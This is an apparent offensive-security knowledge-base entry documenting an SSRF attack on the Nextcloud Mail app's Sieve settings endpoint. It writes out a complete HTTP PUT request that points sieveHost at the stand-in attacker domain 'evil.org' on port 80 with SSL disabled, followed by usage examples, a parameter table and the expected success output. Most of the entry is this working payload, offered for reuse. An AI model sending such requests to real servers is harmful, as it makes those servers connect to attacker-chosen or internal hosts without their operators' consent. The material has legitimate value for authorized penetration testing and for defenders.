---
id: cmd-put-sieve-update
data: >-
  PUT /apps/mail/api/sieve/account/5 HTTP/2

  Host: redacted

  Cookie: redacted

  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101
  Firefox/104.0

  Accept: application/json, text/plain, */*

  Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3

  Accept-Encoding: gzip, deflate

  Content-Type: application/json

  Requesttoken: redacted

  Content-Length: 117

  Origin: redacted

  Sec-Fetch-Dest: empty

  Sec-Fetch-Mode: cors

  Sec-Fetch-Site: same-origin

  Te: trailers


  {"sieveEnabled":true,"sieveHost":"evil.org","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
tags:
  - ssrf
  - put-request
type: command
output: |-
  HTTP/1.1 200 OK
  Content-Type: application/json

  {"success": true}
executor: http
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.874Z'
verified: false
validated: true
submitted: true
---
# PUT-Sieve-Account-Update

## Command

```http
PUT /apps/mail/api/sieve/account/5 HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Requesttoken: redacted
Content-Length: 117
Origin: redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"sieveEnabled":true,"sieveHost":"evil.org","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
```

## Description

Sends a PUT request to update Sieve filter server settings in Nextcloud Mail app, exploiting SSRF by setting sieveHost to an arbitrary domain like 'evil.org' to coerce server connections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sieveHost | Target host for SSRF (e.g., evil.org) | Yes |
| sievePort | Port to connect (e.g., 80) | Yes |
| sieveSslMode | SSL mode ('none' to bypass) | Yes |

## Examples

### Basic Usage

```http
PUT /apps/mail/api/sieve/account/5 ... {"sieveHost":"evil.org","sievePort":"80","sieveSslMode":"none"}
```

### Advanced Usage

Use in Burp Repeater with modified host for internal testing.

## Expected Output

HTTP 200 indicating successful update, triggering backend connection to the host/port; response time varies based on connectivity.

## Related

- [[commands/JSON-Payload-SSRF-Localhost]]
- [[procedures/Modify-SieveHost-for-SSRF-Exploitation]]
